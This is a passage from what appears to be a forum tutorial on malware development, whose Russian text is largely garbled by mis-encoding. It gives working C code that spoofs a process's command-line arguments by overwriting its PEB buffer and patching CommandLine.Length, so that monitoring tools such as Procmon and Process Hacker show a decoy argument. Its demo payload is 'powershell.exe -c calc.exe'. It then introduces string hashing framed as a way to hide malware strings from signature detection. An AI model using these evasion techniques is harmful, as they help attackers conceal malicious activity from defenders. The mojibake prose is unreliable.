        &amp;Si,
        &amp;Pi)) {
        printf(&quot;\t[!] CreateProcessA Failed with Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –ü–æ–ª—É—á–µ–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã PROCESS_BASIC_INFORMATION —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–¥–µ—Ä–∂–∏—Ç –∞–¥—Ä–µ—Å PEB
    if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &amp;PBI, sizeof(PROCESS_BASIC_INFORMATION), &amp;uRetern)) != 0) {
        printf(&quot;\t[!] NtQueryInformationProcess Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // –ß—Ç–µ–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã PEB –∏–∑ –µ–µ –±–∞–∑–æ–≤–æ–≥–æ –∞–¥—Ä–µ—Å–∞ –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ
    if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &amp;pPeb, sizeof(PEB))) {
        printf(&quot;\t[!] Failed To Read Target&#039;s Process Peb \n&quot;);
        return FALSE;
    }

    // –ß—Ç–µ–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã RTL_USER_PROCESS_PARAMETERS –∏–∑ PEB —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞
    // –ß–∏—Ç–∞–µ—Ç—Å—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö 0xFF –±–∞–π—Ç–æ–≤, —á—Ç–æ–±—ã —É–±–µ–¥–∏—Ç—å—Å—è, —á—Ç–æ –º—ã –¥–æ—Å—Ç–∏–≥–ª–∏ —É–∫–∞–∑–∞—Ç–µ–ª—è CommandLine.Buffer
    // 0xFF - —ç—Ç–æ 255, –Ω–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –ª—é–±—ã–º, –Ω–∞ –≤–∞—à –≤—ã–±–æ—Ä
    if (!ReadFromTargetProcess(Pi.hProcess, pPeb-&gt;ProcessParameters, &amp;pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
        printf(&quot;\t[!] Failed To Read Target&#039;s Process ProcessParameters \n&quot;);
        return FALSE;
    }

    // –ó–∞–ø–∏—Å—å —Ä–µ–∞–ª—å–Ω—ã—Ö –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ –≤ –ø—Ä–æ—Ü–µ—Å—Å
    if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms-&gt;CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + 1))) {
        printf(&quot;\t[!] Failed To Write The Real Parameters\n&quot;);
        return FALSE;
    }

    // –û—á–∏—Å—Ç–∫–∞
    HeapFree(GetProcessHeap(), NULL, pPeb);
    HeapFree(GetProcessHeap(), NULL, pParms);

    // –í–æ–∑–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å –Ω–æ–≤—ã–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏
    ResumeThread(Pi.hThread);

    // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤—ã—Ö–æ–¥–Ω—ã—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
    *dwProcessId     = Pi.dwProcessId;
    *hProcess        = Pi.hProcess;
    *hThread         = Pi.hThread;

    // –ü—Ä–æ–≤–µ—Ä–∫–∞, –≤—Å–µ –ª–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã
    if (*dwProcessId != NULL &amp;&amp; *hProcess != NULL &amp;&amp; *hThread != NULL)
        return TRUE;

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è</b><br />
<br />
powershell.exe Totally Legit Argument - —ç—Ç–æ —Ñ–∏–∫—Ç–∏–≤–Ω—ã–π –∞—Ä–≥—É–º–µ–Ω—Ç, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω, –≤ —Ç–æ –≤—Ä–µ–º—è –∫–∞–∫ powershell.exe -c calc.exe - —ç—Ç–æ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784078362.png"
		data-src="https://osint42.org/attachments/1746784078362-png.167/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784078362-png.167/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784078362.png"
			title="1746784078362.png"
			width="1574" height="838" loading="lazy" />
	</div><br />
<br />
–û—Ç–ª–∏—á–Ω–æ Procmon –±—ã–ª –æ–±–º–∞–Ω—É—Ç, –∏ –æ–Ω –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–ª —Ñ–∏–∫—Ç–∏–≤–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏. <b><u>–û–¥–Ω–∞–∫–æ —ç—Ç–∞ –∂–µ —Ç–µ—Ö–Ω–∏–∫–∞ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç —Ç–∞–∫ —Ö–æ—Ä–æ—à–æ —Å –Ω–µ–∫–æ—Ç–æ—Ä—ã–º–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º–∏</u></b>, —Ç–∞–∫–∏–º–∏ –∫–∞–∫ Process Hacker. –ù–∏–∂–µ –ø–æ–∫–∞–∑–∞–Ω —Ä–µ–∑—É–ª—å—Ç–∞—Ç –ø–æ–¥–º–µ–Ω—ã –∞—Ä–≥—É–º–µ–Ω—Ç–∞ –≤ Process Hacker.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784164490.png"
		data-src="https://osint42.org/attachments/1746784164490-png.170/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784164490-png.170/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784164490.png"
			title="1746784164490.png"
			width="1477" height="819" loading="lazy" />
	</div><br />
<br />
–õ–µ–≥–∏—Ç–∏–º–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã –æ—Ç–æ–±—Ä–∞–∂–∞—é—Ç—Å—è Process Hacker, –≤–º–µ—Å—Ç–µ —Å —Ñ—Ä–∞–≥–º–µ–Ω—Ç–æ–º —Ñ–∏–∫—Ç–∏–≤–Ω–æ–≥–æ –∞—Ä–≥—É–º–µ–Ω—Ç–∞. –í —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ –º—ã –ø—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º, –ø–æ—á–µ–º—É —ç—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç, –∏ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏–º —Ä–µ—à–µ–Ω–∏–µ.<br />
<br />
<b>–ê–Ω–∞–ª–∏–∑ –ø—Ä–æ–±–ª–µ–º—ã</b><br />
<br />
–î–ª—è –ª—É—á—à–µ–≥–æ –ø–æ–Ω–∏–º–∞–Ω–∏—è —Ç–æ–≥–æ, –ø–æ—á–µ–º—É –æ—Ç–æ–±—Ä–∞–∂–∞—é—Ç—Å—è –ª–µ–≥–∏—Ç–∏–º–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã, —Ñ–∏–∫—Ç–∏–≤–Ω—ã–π –∞—Ä–≥—É–º–µ–Ω—Ç –±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ powershell.exe AAAAAAA....<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784233648.png"
		data-src="https://osint42.org/attachments/1746784233648-png.172/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784233648-png.172/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784233648.png"
			title="1746784233648.png"
			width="1117" height="90" loading="lazy" />
	</div><br />
<br />
–ü—Ä–æ–≤–µ—Ä–∫–∞ Process Hacker —Å–Ω–æ–≤–∞ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç, —á—Ç–æ —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É—é—Ç—Å—è –∫–∞–∫ –ª–µ–≥–∏—Ç–∏–º—ã–µ, —Ç–∞–∫ –∏ —Ñ–∏–∫—Ç–∏–≤–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784242761.png"
		data-src="https://osint42.org/attachments/1746784242761-png.173/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784242761-png.173/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784242761.png"
			title="1746784242761.png"
			width="1537" height="786" loading="lazy" />
	</div><br />
<br />
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ PEB-&gt;ProcessParameters.CommandLine.Buffer –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∏ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ Process Hacker –∏ –¥—Ä—É–≥–∏–º–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º–∏, —Ç–∞–∫–∏–º–∏ –∫–∞–∫ Process Explorer, –ø–æ—Ç–æ–º—É —á—Ç–æ —ç—Ç–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –∏—Å–ø–æ–ª—å–∑—É—é—Ç NtQueryInformationProcess –¥–ª—è —á—Ç–µ–Ω–∏—è –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. <b>–ü–æ—Å–∫–æ–ª—å–∫—É —ç—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è, –æ–Ω–∏ –º–æ–≥—É—Ç –≤–∏–¥–µ—Ç—å, —á—Ç–æ –≤ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ PEB-&gt;ProcessParameters.CommandLine.Buffer.<br />
<br />
–†–µ—à–µ–Ω–∏–µ</b><br />
<br />
–≠—Ç–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã —Å—á–∏—Ç—ã–≤–∞—é—Ç CommandLine.Buffer –¥–æ –¥–ª–∏–Ω—ã, —É–∫–∞–∑–∞–Ω–Ω–æ–π –≤ CommandLine.Length. –û–Ω–∏ –Ω–µ –ø–æ–ª–∞–≥–∞—é—Ç—Å—è –Ω–∞ —Ç–æ, —á—Ç–æ CommandLine.Buffer –∑–∞–≤–µ—Ä—à–∞–µ—Ç—Å—è –Ω—É–ª–µ–≤—ã–º —Å–∏–º–≤–æ–ª–æ–º, –ø–æ—Ç–æ–º—É —á—Ç–æ Microsoft —É—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç –≤ —Å–≤–æ–µ–π –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏, —á—Ç–æ UNICODE_STRING.Buffer –º–æ–∂–µ—Ç –Ω–µ –±—ã—Ç—å –∑–∞–≤–µ—Ä—à–µ–Ω –Ω—É–ª–µ–≤—ã–º —Å–∏–º–≤–æ–ª–æ–º.<br />
<br />
–ö–æ—Ä–æ—á–µ –≥–æ–≤–æ—Ä—è, —ç—Ç–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞—é—Ç –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –±–∞–π—Ç, —Å—á–∏—Ç—ã–≤–∞–µ–º—ã—Ö –∏–∑ CommandLine.Buffer, —Ä–∞–≤–Ω—ã–º CommandLine.Length, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å —á—Ç–µ–Ω–∏—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –Ω–µ–Ω—É–∂–Ω—ã—Ö –±–∞–π—Ç –≤ —Å–ª—É—á–∞–µ, –µ—Å–ª–∏ CommandLine.Buffer –Ω–µ –∑–∞–≤–µ—Ä—à–µ–Ω –Ω—É–ª–µ–≤—ã–º —Å–∏–º–≤–æ–ª–æ–º.<br />
<br />
–í–æ–∑–º–æ–∂–Ω–æ –æ–±–º–∞–Ω—É—Ç—å —ç—Ç–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã, —É—Å—Ç–∞–Ω–æ–≤–∏–≤ CommandLine.Length –º–µ–Ω—å—à–µ —Ä–∞–∑–º–µ—Ä–∞ –±—É—Ñ–µ—Ä–∞. –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä–æ–≤–∞—Ç—å, —Å–∫–æ–ª—å–∫–æ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤–Ω—É—Ç—Ä–∏ CommandLine.Buffer –±—É–¥–µ—Ç –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–æ. –≠—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å, –ø–µ—Ä–µ–ø–∏—Å–∞–≤ –∞–¥—Ä–µ—Å CommandLine.Length –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ, –ø–µ—Ä–µ–¥–∞–≤ –∂–µ–ª–∞–µ–º—ã–π —Ä–∞–∑–º–µ—Ä –±—É—Ñ–µ—Ä–∞ –¥–ª—è —á—Ç–µ–Ω–∏—è –≤–Ω–µ—à–Ω–∏–º–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º–∏.<br />
<br />
<b>–ü–∞—Ç—á–∏–Ω–≥ CommandLine.Length</b><br />
<br />
–°–ª–µ–¥—É—é—â–∏–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –ø–∞—Ç—á–∏—Ç PEB-&gt;ProcessParameters.CommandLine.Length, —á—Ç–æ–±—ã –æ–≥—Ä–∞–Ω–∏—á–∏—Ç—å —Ç–æ, —á—Ç–æ –º–æ–∂–µ—Ç —á–∏—Ç–∞—Ç—å Process Hacker —Ç–æ–ª—å–∫–æ –¥–ª—è powershell.exe. –°–Ω–∞—á–∞–ª–∞ –∞—Ä–≥—É–º–µ–Ω—Ç –ø–æ–¥–º–µ–Ω—ã —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –≤ &quot;Totally Legit Argument&quot;, –∞ –∑–∞—Ç–µ–º –¥–ª–∏–Ω–∞ –ø–∞—Ç—á–∏—Ç—Å—è, —á—Ç–æ–±—ã –±—ã—Ç—å —Ä–∞–∑–º–µ—Ä–æ–º sizeof(L&quot;powershell.exe&quot;).<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>DWORD dwNewLen = sizeof(L&quot;powershell.exe&quot;);

if (!WriteToTargetProcess(Pi.hProcess, ((PBYTE)pPeb-&gt;ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&amp;dwNewLen, sizeof(DWORD))){
  return FALSE;
}</code></pre>
	</div>
</div><br />
–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è<br />
<br />
<b>–ü—Ä–æ—Å–º–æ—Ç—Ä Process Hacker.</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784252928.png"
		data-src="https://osint42.org/attachments/1746784252928-png.174/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784252928-png.174/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784252928.png"
			title="1746784252928.png"
			width="1454" height="850" loading="lazy" />
	</div><br />
<br />
<b>Procmon view.</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784259970.png"
		data-src="https://osint42.org/attachments/1746784259970-png.175/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784259970-png.175/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784259970.png"
			title="1746784259970.png"
			width="1382" height="516" loading="lazy" />
	</div></div>
						

							<h2>–°–∫—Ä—ã—Ç–∏–µ —Å—Ç—Ä–æ–∫</h2>

							

							

							<div class="bbWrapper"><b>–•–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ</b> - —ç—Ç–æ —Ç–µ—Ö–Ω–∏–∫–∞, –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è –∫—É—Å–∫–∞ –¥–∞–Ω–Ω—ã—Ö, –Ω–∞–∑—ã–≤–∞–µ–º–æ–≥–æ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–µ–º –∏–ª–∏ —Ö–µ—à-–∫–æ–¥–æ–º. –•–µ—à-–∞–ª–≥–æ—Ä–∏—Ç–º—ã —Ä–∞–∑—Ä–∞–±–æ—Ç–∞–Ω—ã –∫–∞–∫ –æ–¥–Ω–æ—Å—Ç–æ—Ä–æ–Ω–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –≤—ã—á–∏—Å–ª–∏—Ç–µ–ª—å–Ω–æ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –∏—Å—Ö–æ–¥–Ω—ã–µ –≤—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ, –∏—Å–ø–æ–ª—å–∑—É—è —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–µ. –•–µ—à-–∫–æ–¥ –æ–±—ã—á–Ω–æ –∏–º–µ–µ—Ç –±–æ–ª–µ–µ –∫–æ—Ä–æ—Ç–∫–∏–π —Ä–∞–∑–º–µ—Ä –∏ –±—ã—Å—Ç—Ä–µ–µ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç—Å—è. –ü—Ä–∏ —Å—Ä–∞–≤–Ω–µ–Ω–∏–∏ —Å—Ç—Ä–æ–∫ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è –±—ã—Å—Ç—Ä–æ–≥–æ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Ä–∞–≤–µ–Ω—Å—Ç–≤–∞ –¥–≤—É—Ö —Å—Ç—Ä–æ–∫, –≤ —Å—Ä–∞–≤–Ω–µ–Ω–∏–∏ —Å —Å—Ä–∞–≤–Ω–µ–Ω–∏–µ–º —Å–∞–º–∏—Ö —Å—Ç—Ä–æ–∫, –æ—Å–æ–±–µ–Ω–Ω–æ –µ—Å–ª–∏ —Å—Ç—Ä–æ–∫–∏ –¥–ª–∏–Ω–Ω—ã–µ.<br />
<br />
–í –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ —Å—Ç—Ä–æ–∫ –ø–æ–ª–µ–∑–Ω–æ –¥–ª—è —Å–∫—Ä—ã—Ç–∏—è —Å—Ç—Ä–æ–∫, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö –≤ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏, —Ç–∞–∫ –∫–∞–∫ —Å—Ç—Ä–æ–∫–∏ –º–æ–≥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –∫–∞–∫ —Å–∏–≥–Ω–∞—Ç—É—Ä—ã –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –±–∏–Ω–∞—Ä–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤.<br />
<br />
<b>–•–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ —Å—Ç—Ä–æ–∫</b><br />
<br />
–î–∞–≤–∞–π—Ç–µ —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –∞–ª–≥–æ—Ä–∏—Ç–º—ã —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫. –í–∞–∂–Ω–æ –ø–æ–Ω–∏–º–∞—Ç—å, —á—Ç–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–º —ç—Ç–∏—Ö –∞–ª–≥–æ—Ä–∏—Ç–º–æ–≤ —è–≤–ª—è–µ—Ç—Å—è —á–∏—Å–ª–æ, –≤—ã—Ä–∞–∂–µ–Ω–Ω–æ–µ –≤ —à–µ—Å—Ç–Ω–∞–¥—Ü–∞—Ç–µ—Ä–∏—á–Ω–æ–º —Ñ–æ—Ä–º–∞—Ç–µ, —Ç–∞–∫ –∫–∞–∫ —ç—Ç–æ –±–æ–ª–µ–µ –∞–∫–∫—É—Ä–∞—Ç–Ω–æ –∏ –∫–æ–º–ø–∞–∫—Ç–Ω–æ.<br />
<br />
–í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ —Ä–∞—Å—Å–º–∞—Ç—Ä–∏–≤–∞—é—Ç—Å—è —Å–ª–µ–¥—É—é—â–∏–µ –∞–ª–≥–æ—Ä–∏—Ç–º—ã —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫:<br />
<br />
Dbj2<br />
JenkinsOneAtATime32Bit<br />
LoseLose Rotr32<br />
<br />
–°—É—â–µ—Å—Ç–≤—É–µ—Ç –≥–æ—Ä–∞–∑–¥–æ –±–æ–ª—å—à–µ –∞–ª–≥–æ—Ä–∏—Ç–º–æ–≤ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫, —á–µ–º —Ç–µ, –∫–æ—Ç–æ—Ä—ã–µ –æ–±—Å—É–∂–¥–∞—é—Ç—Å—è –≤ —ç—Ç–æ–π —Å—å—Ç–∞—Ç—å–µ, –∏ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –∏–∑ –Ω–∏—Ö –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ –≤ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–∏ <a href="https://github.com/vxunderground/VX-API" target="_blank" class="link link--external" rel="noopener">VX-API –Ω–∞ GitHub.</a><br />
<br />
<b>–†–µ–∫–æ–º–µ–Ω–¥—É—é –ø—Ä–∏—Å–º–æ—Ç—Ä–µ—Ç—å—Å—è –∫ —ç—Ç–æ–º—É —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—é, —Ç–∞–º –æ—á–µ–Ω—å –º–Ω–æ–≥–æ –ø–æ–ª–µ–∑–Ω—ã—Ö –º–æ–¥—É–ª–µ–π –Ω–∞ –°++ –¥–ª—è —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –º–∞–ª–≤–∞—Ä–∏ –∏ –ø–µ–Ω—Ç–µ—Å—Ç–∏–Ω–≥–∞.)<br />
<br />
Dbj2</b><br />
<br />
Dbj2 - —ç—Ç–æ –ø—Ä–æ—Å—Ç–æ–π –∏ –±—ã—Å—Ç—Ä—ã–π –∞–ª–≥–æ—Ä–∏—Ç–º —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è, –≤ –æ—Å–Ω–æ–≤–Ω–æ–º –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–π –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è —Å—Ç—Ä–æ–∫, –Ω–æ —Ç–∞–∫–∂–µ –ø—Ä–∏–º–µ–Ω–∏–º—ã–π –∫ –¥—Ä—É–≥–∏–º —Ç–∏–ø–∞–º –¥–∞–Ω–Ω—ã—Ö. –û–Ω —Ä–∞–±–æ—Ç–∞–µ—Ç, –∏—Ç–µ—Ä–∏—Ä—É—è—Å—å –ø–æ —Å–∏–º–≤–æ–ª–∞–º –≤–æ –≤—Ö–æ–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–µ –∏ –∏—Å–ø–æ–ª—å–∑—É—è –∫–∞–∂–¥—ã–π —Å–∏–º–≤–æ–ª –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Ç–µ–∫—É—â–µ–≥–æ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏—è —Å–æ–≥–ª–∞—Å–Ω–æ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–º—É –∞–ª–≥–æ—Ä–∏—Ç–º—É, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω –≤ —Å–ª–µ–¥—É—é—â–µ–º —Ñ—Ä–∞–≥–º–µ–Ω—Ç–µ.<br />
<br />
hash = ((hash &lt;&lt; 5) + hash) + c<br />
<br />
hash - —ç—Ç–æ —Ç–µ–∫—É—â–µ–µ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–µ, c - —Ç–µ–∫—É—â–∏–π —Å–∏–º–≤–æ–ª –≤–æ –≤—Ö–æ–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–µ, –∏ &lt;&lt; - –æ–ø–µ—Ä–∞—Ç–æ—Ä –±–∏—Ç–æ–≤–æ–≥–æ —Å–¥–≤–∏–≥–∞ –≤–ª–µ–≤–æ.<br />
<br />
–†–µ–∑—É–ª—å—Ç–∏—Ä—É—é—â–µ–µ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–µ - —ç—Ç–æ –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–µ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ, —É–Ω–∏–∫–∞–ª—å–Ω–æ–µ –¥–ª—è –≤—Ö–æ–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏. –ò–∑–≤–µ—Å—Ç–Ω–æ, —á—Ç–æ Djb2 –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç —Ö–æ—Ä–æ—à–µ–µ —Ä–∞—Å–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–π, —á—Ç–æ –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –Ω–∏–∑–∫–æ–π –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç–∏ –∫–æ–ª–ª–∏–∑–∏–π –º–µ–∂–¥—É —Ä–∞–∑–Ω—ã–º–∏ —Å—Ç—Ä–æ–∫–∞–º–∏ –∏ –∏—Ö —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–º–∏ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏—è–º–∏.<br />
<br />
